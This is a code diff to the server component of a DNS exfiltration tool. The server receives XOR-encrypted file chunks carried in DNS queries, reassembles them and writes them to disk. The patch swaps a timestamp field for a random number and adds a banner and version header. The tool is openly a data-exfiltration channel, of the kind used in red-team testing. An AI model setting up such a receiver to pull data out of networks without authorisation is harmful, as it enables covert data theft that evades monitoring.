@@ -1,3 +1,6 @@
+# Title: DNS Exfiltration Tool
+# Author: lefayjey
+
 import argparse
 from dnslib import DNSRecord, DNSHeader
 from dnslib.server import DNSServer, BaseResolver
@@ -63,14 +66,14 @@ class DataResolver(BaseResolver):
 
         try:
             metadata = labels[5]
-            filename_hex, timestamp, number_of_chunks = metadata.split('|')
+            filename_hex, randnum, number_of_chunks = metadata.split('|')
             filename_enc = bytearray.fromhex(filename_hex)
             filename = self.xor_decrypt(filename_enc, self.password).decode()
         except:
             #print(color(f"\n[?] Query with unknown format received!"))
             return reply
 
-        file_key = f"{timestamp}_{filename}"
+        file_key = f"{randnum}_{filename}"
 
         if file_key not in self.data_store:
             self.data_store[file_key] = [None] * int(number_of_chunks)
@@ -83,7 +86,7 @@ class DataResolver(BaseResolver):
 
         print_progress_bar(chunk_id + 1, int(number_of_chunks), prefix=f'Receiving file {file_key}:', suffix='Complete', length=50)
 
-        if chunk_id == int(number_of_chunks) - 1:
+        if chunk_id == int(number_of_chunks) - 1 :
             chunks = self.data_store[file_key]
             print(color(f"\n[+] Transfer of {file_key} complete!"))
             if None in chunks:
@@ -106,7 +109,7 @@ class DataResolver(BaseResolver):
                             for chunk in iter(lambda: f.read(4096), b""):
                                 md5_hash.update(chunk)
                         md5_checksum = md5_hash.hexdigest()
-                        print(color(f"[+] MD5 checksum of {file_key}: {md5_checksum}"))
+                        print(color(f"\n[+] MD5 checksum of {file_key}: {md5_checksum}"))
                         print(color(f"[+] Data written to ./{file_key}"))
                         del self.data_store[file_key]  # Clear data after writing
                 except Exception as e:
@@ -127,6 +130,17 @@ if __name__ == "__main__":
     parser.add_argument("--usetcp", action="store_true", help="Use TCP instead of UDP")
 
     args = parser.parse_args()
+
+    print("       __                     _____ __                                   ")
+    print("  ____/ /___  ________  _  __/ __(_) /    ________  ______   _____  _____")
+    print(" / __  / __ \/ ___/ _ \| |/_/ /_/ / /    / ___/ _ \/ ___/ | / / _ \/ ___/")
+    print("/ /_/ / / / (__  )  __/>  </ __/ / /    (__  )  __/ /   | |/ /  __/ /    ")
+    print("\__,_/_/ /_/____/\___/_/|_/_/ /_/_/____/____/\___/_/    |___/\___/_/     ")
+    print("                                 /_____/                                 ")
+    print("")
+    print("Author: lefayjey")
+    print("Version: 1.2.0")
+    print("")
 
     dns_server_ip = args.dns_server_ip
     password = args.password
